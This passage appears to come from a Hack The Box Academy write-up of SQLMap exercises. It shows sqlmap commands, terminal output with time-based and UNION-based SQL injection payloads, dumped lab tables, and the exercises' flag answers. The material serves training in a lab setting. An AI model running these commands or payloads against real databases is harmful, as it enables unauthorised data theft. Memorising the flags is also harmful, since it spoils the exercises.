    Payload: col=id`=`id` AND 5819=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C WHERE 0 XOR 1) AND `id`=`id
---
[22:28:46] [INFO] the back-end DBMS is MySQL
[22:28:46] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 
do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] Y
web server operating system: Linux Debian 10 (buster)
web application technology: Apache 2.4.38
back-end DBMS: MySQL > 5.0.12 (MariaDB fork)
do you want sqlmap to consider provided table(s):
[1] as LIKE table names (default)
[2] as exact table names
> 1
[22:29:03] [INFO] searching tables LIKE 'flag6'
[22:29:03] [INFO] fetching number of databases with tables LIKE 'flag6'
[22:29:03] [INFO] retrieved: 1
[22:29:22] [INFO] retrieved: 
[22:29:38] [INFO] adjusting time delay to 3 seconds due to good response times
testdb
[22:34:48] [INFO] fetching number of tables LIKE 'flag6' in database 'testdb'
[22:34:48] [INFO] retrieved: 1
[22:35:07] [INFO] retrieved: flag6
Database: testdb
[1 table]
+-------+
| flag6 |
+-------+

do you want to dump found table(s) entries? [Y/n] Y
which database(s)?
[a]ll (default)
[testdb]
[q]uit
> a
which table(s) of database 'testdb'?
[a]ll (default)
[flag6]
[s]kip
[q]uit
> a
[22:39:43] [INFO] fetching columns for table 'flag6' in database 'testdb'
[22:39:43] [INFO] retrieved: 2
[22:40:19] [INFO] retrieved: id
[22:42:02] [INFO] retrieved: content
[22:49:10] [INFO] fetching entries for table 'flag6' in database 'testdb'
[22:49:10] [INFO] fetching number of entries for table 'flag6' in database 'testdb'
[22:49:10] [INFO] retrieved: 1
[22:49:28] [WARNING] (case) time-based comparison requires reset of statistical model, please wait.............................. (done)
HTB{
[22:54:23] [WARNING] turning off pre-connect mechanism because of connection reset(s)
[22:54:23] [CRITICAL] connection reset to the target URL. sqlmap is going to retry the request(s)
[22:54:24] [CRITICAL] connection exception detected in dumping phase ('connection reset to the target URL')
[22:54:24] [INFO] fetched data logged to text files under '/home/htb-ac-2162140/.local/share/sqlmap/output/154.57.164.82'
[22:54:24] [WARNING] your sqlmap version is outdated

[*] ending @ 22:54:24 /2026-09-08/

┌─[eu-academy-2]─[10.10.15.97]─[htb-ac-2162140@htb-jly8u2dih3-htb-cloud-com]─[~]
└──╼ [★]$ sqlmap -r req6.txt --level=5 --risk=3 --batch -D testdb -T flag6 --dump
<SNIP>
[23:32:48] [WARNING] (case) time-based comparison requires reset of statistical model, please wait.............................. (done)      
HTB{v1nc3_mcm4h0n_15_4570n15h3d}
<SNIP>
```

**Answer:** `HTB{v1nc3_mcm4h0n_15_4570n15h3d}`

---

### 3. What's the contents of table flag7? (Case #7)

Context:
- Capture the request for SQLMap exploiting:
```bash
┌─[eu-academy-2]─[10.10.15.97]─[htb-ac-2162140@htb-jly8u2dih3-htb-cloud-com]─[~]
└──╼ [★]$ sqlmap -r req7.txt --union-cols 5-8 --level=3 --risk=3 --dump -T flag7 --technique=U -D testdb --batch
        ___
       __H__
 ___ ___[,]_____ ___ ___  {1.9.6#stable}
|_ -| . [']     | .'| . |
|___|_  [,]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 00:22:35 /2026-09-09/

[00:22:35] [INFO] parsing HTTP request from 'req7.txt'
[00:22:35] [INFO] resuming back-end DBMS 'mysql' 
[00:22:35] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: id (GET)
    Type: UNION query
    Title: Generic UNION query (NULL) - 5 columns (custom)
    Payload: id=1 UNION ALL SELECT NULL,NULL,NULL,CONCAT(CONCAT('qzvqq','oSQMcUCDawKzoeJosLSlQTeRdWsaGAxRjTmACEoa'),'qpvpq'),NULL-- KnGi
---
[00:22:35] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian 10 (buster)
web application technology: Apache 2.4.38
back-end DBMS: MySQL 5 (MariaDB fork)
[00:22:35] [INFO] fetching columns for table 'flag7' in database 'testdb'
[00:22:36] [INFO] fetching entries for table 'flag7' in database 'testdb'
Database: testdb
Table: flag7
[1 entry]
+----+-----------------------+
| id | content               |
+----+-----------------------+
| 1  | HTB{un173_7h3_un173d} |
+----+-----------------------+

[00:22:36] [INFO] table 'testdb.flag7' dumped to CSV file '/home/htb-ac-2162140/.local/share/sqlmap/output/154.57.164.82/dump/testdb/flag7.csv'
[00:22:36] [INFO] fetched data logged to text files under '/home/htb-ac-2162140/.local/share/sqlmap/output/154.57.164.82'
[00:22:36] [WARNING] your sqlmap version is outdated

[*] ending @ 00:22:36 /2026-09-09/

```

**Answer:** `HTB{un173_7h3_un173d}`

---

[Back to Module Index](./README.md)
